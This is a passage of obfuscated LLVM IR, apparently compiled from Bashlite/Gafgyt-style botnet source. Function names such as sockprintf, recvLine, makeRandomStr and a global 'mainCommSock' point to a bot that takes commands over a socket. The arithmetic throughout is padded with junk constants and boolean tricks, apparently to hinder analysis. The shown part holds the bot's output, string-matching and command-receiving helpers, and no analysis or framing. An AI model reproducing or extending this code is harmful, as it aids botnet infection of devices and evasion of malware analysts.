  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, -2107384740
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, -2107384740
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 1, -1
  %54 = xor i32 %52, %53
  %55 = and i32 %54, %52
  %56 = and i32 %52, 1
  %57 = icmp ne i32 %55, 0
  br i1 %57, label %76, label %58

; <label>:58:                                     ; preds = %51
  br label %59

; <label>:59:                                     ; preds = %70, %58
  %60 = load i32, i32* %7, align 4
  %61 = icmp sgt i32 %60, 0
  br i1 %61, label %62, label %75

; <label>:62:                                     ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = load i32, i32* %10, align 4
  call void @printchar(i8** %63, i32 %64)
  %65 = load i32, i32* %9, align 4
  %66 = sub i32 %65, 92304450
  %67 = add i32 %66, 1
  %68 = add i32 %67, 92304450
  %69 = add nsw i32 %65, 1
  store i32 %68, i32* %9, align 4
  br label %70

; <label>:70:                                     ; preds = %62
  %71 = load i32, i32* %7, align 4
  %72 = sub i32 0, -1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, -1
  store i32 %73, i32* %7, align 4
  br label %59

; <label>:75:                                     ; preds = %59
  br label %76

; <label>:76:                                     ; preds = %75, %51
  br label %77

; <label>:77:                                     ; preds = %91, %76
  %78 = load i8*, i8** %6, align 8
  %79 = load i8, i8* %78, align 1
  %80 = icmp ne i8 %79, 0
  br i1 %80, label %81, label %94

; <label>:81:                                     ; preds = %77
  %82 = load i8**, i8*** %5, align 8
  %83 = load i8*, i8** %6, align 8
  %84 = load i8, i8* %83, align 1
  %85 = zext i8 %84 to i32
  call void @printchar(i8** %82, i32 %85)
  %86 = load i32, i32* %9, align 4
  %87 = add i32 %86, -1566982792
  %88 = add i32 %87, 1
  %89 = sub i32 %88, -1566982792
  %90 = add nsw i32 %86, 1
  store i32 %89, i32* %9, align 4
  br label %91

; <label>:91:                                     ; preds = %81
  %92 = load i8*, i8** %6, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %6, align 8
  br label %77

; <label>:94:                                     ; preds = %77
  br label %95

; <label>:95:                                     ; preds = %107, %94
  %96 = load i32, i32* %7, align 4
  %97 = icmp sgt i32 %96, 0
  br i1 %97, label %98, label %113

; <label>:98:                                     ; preds = %95
  %99 = load i8**, i8*** %5, align 8
  %100 = load i32, i32* %10, align 4
  call void @printchar(i8** %99, i32 %100)
  %101 = load i32, i32* %9, align 4
  %102 = sub i32 0, %101
  %103 = sub i32 0, 1
  %104 = add i32 %102, %103
  %105 = sub i32 0, %104
  %106 = add nsw i32 %101, 1
  store i32 %105, i32* %9, align 4
  br label %107

; <label>:107:                                    ; preds = %98
  %108 = load i32, i32* %7, align 4
  %109 = add i32 %108, -1936552433
  %110 = add i32 %109, -1
  %111 = sub i32 %110, -1936552433
  %112 = add nsw i32 %108, -1
  store i32 %111, i32* %7, align 4
  br label %95

; <label>:113:                                    ; preds = %95
  %114 = load i32, i32* %9, align 4
  ret i32 %114
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %126

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %74, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %85

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %74

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 0, 48
  %64 = add i32 %62, %63
  %65 = sub nsw i32 %62, 48
  %66 = sub i32 0, 10
  %67 = add i32 %64, %66
  %68 = sub nsw i32 %64, 10
  %69 = load i32, i32* %18, align 4
  %70 = sub i32 %69, -1888469146
  %71 = add i32 %70, %67
  %72 = add i32 %71, -1888469146
  %73 = add nsw i32 %69, %67
  store i32 %72, i32* %18, align 4
  br label %74

; <label>:74:                                     ; preds = %61, %55
  %75 = load i32, i32* %18, align 4
  %76 = sub i32 0, 48
  %77 = sub i32 %75, %76
  %78 = add nsw i32 %75, 48
  %79 = trunc i32 %77 to i8
  %80 = load i8*, i8** %17, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 -1
  store i8* %81, i8** %17, align 8
  store i8 %79, i8* %81, align 1
  %82 = load i32, i32* %11, align 4
  %83 = load i32, i32* %21, align 4
  %84 = udiv i32 %83, %82
  store i32 %84, i32* %21, align 4
  br label %52

; <label>:85:                                     ; preds = %52
  %86 = load i32, i32* %19, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %115

; <label>:88:                                     ; preds = %85
  %89 = load i32, i32* %13, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %111

; <label>:91:                                     ; preds = %88
  %92 = load i32, i32* %14, align 4
  %93 = xor i32 2, -1
  %94 = xor i32 %92, %93
  %95 = and i32 %94, %92
  %96 = and i32 %92, 2
  %97 = icmp ne i32 %95, 0
  br i1 %97, label %98, label %111

; <label>:98:                                     ; preds = %91
  %99 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %99, i32 45)
  %100 = load i32, i32* %20, align 4
  %101 = sub i32 0, %100
  %102 = sub i32 0, 1
  %103 = add i32 %101, %102
  %104 = sub i32 0, %103
  %105 = add nsw i32 %100, 1
  store i32 %104, i32* %20, align 4
  %106 = load i32, i32* %13, align 4
  %107 = add i32 %106, -1975150433
  %108 = add i32 %107, -1
  %109 = sub i32 %108, -1975150433
  %110 = add nsw i32 %106, -1
  store i32 %109, i32* %13, align 4
  br label %114

; <label>:111:                                    ; preds = %91, %88
  %112 = load i8*, i8** %17, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 -1
  store i8* %113, i8** %17, align 8
  store i8 45, i8* %113, align 1
  br label %114

; <label>:114:                                    ; preds = %111, %98
  br label %115

; <label>:115:                                    ; preds = %114, %85
  %116 = load i32, i32* %20, align 4
  %117 = load i8**, i8*** %9, align 8
  %118 = load i8*, i8** %17, align 8
  %119 = load i32, i32* %13, align 4
  %120 = load i32, i32* %14, align 4
  %121 = call i32 @prints(i8** %117, i8* %118, i32 %119, i32 %120)
  %122 = sub i32 %116, 424270456
  %123 = add i32 %122, %121
  %124 = add i32 %123, 424270456
  %125 = add nsw i32 %116, %121
  store i32 %124, i32* %8, align 4
  br label %126

; <label>:126:                                    ; preds = %115, %25
  %127 = load i32, i32* %8, align 4
  ret i32 %127
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.261, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %89 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %131

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 false, %30
  %32 = xor i1 false, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, false
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, true
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %131

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %80

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 false, %69
  %71 = xor i1 false, true
  %72 = and i1 %68, %71
  %73 = xor i1 true, true
  %74 = and i1 %73, false
  %75 = and i1 true, %71
  %76 = or i1 %70, %72
  %77 = or i1 %74, %75
  %78 = xor i1 %76, %77
  %79 = xor i1 %68, true
  br label %80

; <label>:80:                                     ; preds = %62, %57
  %81 = phi i1 [ false, %57 ], [ %78, %62 ]
  %82 = xor i1 %81, true
  %83 = and i1 true, %82
  %84 = xor i1 true, true
  %85 = and i1 %81, %84
  %86 = or i1 %83, %85
  %87 = xor i1 %81, true
  %88 = zext i1 %86 to i32
  store i32 %88, i32* %3, align 4
  br label %131

; <label>:89:                                     ; preds = %2
  %90 = load i8*, i8** %4, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 @toupper(i32 %92) #9
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = call i32 @toupper(i32 %96) #9
  %98 = icmp eq i32 %93, %97
  br i1 %98, label %99, label %117

; <label>:99:                                     ; preds = %89
  %100 = load i8*, i8** %4, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  %102 = load i8*, i8** %5, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i32 @wildString(i8* %101, i8* %103)
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = and i1 true, %106
  %108 = xor i1 true, true
  %109 = and i1 %105, %108
  %110 = xor i1 true, true
  %111 = and i1 %110, true
  %112 = and i1 true, %108
  %113 = or i1 %107, %109
  %114 = or i1 %111, %112
  %115 = xor i1 %113, %114
  %116 = xor i1 %105, true
  br label %117

; <label>:117:                                    ; preds = %99, %89
  %118 = phi i1 [ false, %89 ], [ %115, %99 ]
  %119 = xor i1 %118, true
  %120 = and i1 false, %119
  %121 = xor i1 false, true
  %122 = and i1 %118, %121
  %123 = xor i1 true, true
  %124 = and i1 %123, false
  %125 = and i1 true, %121
  %126 = or i1 %120, %122
  %127 = or i1 %124, %125
  %128 = xor i1 %126, %127
  %129 = xor i1 %118, true
  %130 = zext i1 %128 to i32
  store i32 %130, i32* %3, align 4
  br label %131

; <label>:131:                                    ; preds = %117, %80, %43, %9
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %28

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, 395964763
  %14 = add i32 %13, 65
  %15 = add i32 %14, 395964763
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = add i32 %23, -747062357
  %25 = add i32 %24, 1
  %26 = sub i32 %25, -747062357
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %5, align 4
  br label %6

; <label>:28:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -3036666454059338458, -1
  %47 = and i64 %44, -3036666454059338458
  %48 = and i64 %43, %46
  %49 = and i64 %45, -3036666454059338458
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -3036666454059338458, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = add i32 %60, -1033519919
  %62 = add i32 %61, 1
  %63 = sub i32 %62, -1033519919
  %64 = add nsw i32 %60, 1
  %65 = call i32 @select(i32 %63, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %65, i32* %12, align 4
  %66 = icmp sle i32 %65, 0
  br i1 %66, label %67, label %124

; <label>:67:                                     ; preds = %33
  br label %68

; <label>:68:                                     ; preds = %117, %67
  %69 = load i32, i32* %13, align 4
  %70 = icmp slt i32 %69, 10
  br i1 %70, label %71, label %123

; <label>:71:                                     ; preds = %68
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %71
  %75 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 0
  %77 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %76) #5, !srcloc !3
  %78 = extractvalue { i64, i64* } %77, 0
  %79 = extractvalue { i64, i64* } %77, 1
  %80 = trunc i64 %78 to i32
  store i32 %80, i32* %14, align 4
  %81 = ptrtoint i64* %79 to i64
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  br label %83

; <label>:83:                                     ; preds = %74
  %84 = load i32, i32* %5, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %88 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %89 = load i32, i32* %5, align 4
  %90 = sdiv i32 %89, 64
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 %91
  %93 = load i64, i64* %92, align 8
  %94 = xor i64 %93, -1
  %95 = xor i64 %87, -1
  %96 = xor i64 -1740756882987690379, -1
  %97 = and i64 %94, -1740756882987690379
  %98 = and i64 %93, %96
  %99 = and i64 %95, -1740756882987690379
  %100 = and i64 %87, %96
  %101 = or i64 %97, %98
  %102 = or i64 %99, %100
  %103 = xor i64 %101, %102
  %104 = or i64 %94, %95
  %105 = xor i64 %104, -1
  %106 = or i64 -1740756882987690379, %96
  %107 = and i64 %105, %106
  %108 = or i64 %103, %107
  %109 = or i64 %93, %87
  store i64 %108, i64* %92, align 8
  %110 = load i32, i32* %5, align 4
  %111 = add i32 %110, -476844789
  %112 = add i32 %111, 1
  %113 = sub i32 %112, -476844789
  %114 = add nsw i32 %110, 1
  %115 = call i32 @select(i32 %113, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %115, i32* %12, align 4
  %116 = icmp sle i32 %115, 0
  br i1 %116, label %117, label %122

; <label>:117:                                    ; preds = %83
  %118 = load i32, i32* %13, align 4
  %119 = sub i32 0, 1
  %120 = sub i32 %118, %119
  %121 = add nsw i32 %118, 1
  store i32 %120, i32* %13, align 4
  br label %68

; <label>:122:                                    ; preds = %83
  br label %123

; <label>:123:                                    ; preds = %122, %68
  br label %124

; <label>:124:                                    ; preds = %123, %33
  store i32 0, i32* %18, align 4
  %125 = load i8*, i8** %6, align 8
  store i8* %125, i8** %17, align 8
  br label %126

; <label>:126:                                    ; preds = %147, %124
  %127 = load i32, i32* %7, align 4
  %128 = sub i32 %127, -865764529
  %129 = add i32 %128, -1
  %130 = add i32 %129, -865764529
  %131 = add nsw i32 %127, -1
  store i32 %130, i32* %7, align 4
  %132 = icmp sgt i32 %127, 1
  br i1 %132, label %133, label %154

; <label>:133:                                    ; preds = %126
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i64 @recv(i32 %134, i8* %16, i64 1, i32 0)
  %136 = icmp ne i64 %135, 1
  br i1 %136, label %137, label %139

; <label>:137:                                    ; preds = %133
  %138 = load i8*, i8** %17, align 8
  store i8 0, i8* %138, align 1
  store i32 -1, i32* %4, align 4
  br label %157

; <label>:139:                                    ; preds = %133
  %140 = load i8, i8* %16, align 1
  %141 = load i8*, i8** %17, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 1
  store i8* %142, i8** %17, align 8
  store i8 %140, i8* %141, align 1
  %143 = load i8, i8* %16, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 10
  br i1 %145, label %146, label %147

; <label>:146:                                    ; preds = %139
  br label %154

; <label>:147:                                    ; preds = %139
  %148 = load i32, i32* %18, align 4
  %149 = sub i32 0, %148
  %150 = sub i32 0, 1
  %151 = add i32 %149, %150
  %152 = sub i32 0, %151
  %153 = add nsw i32 %148, 1
  store i32 %152, i32* %18, align 4
  br label %126

; <label>:154:                                    ; preds = %146, %126
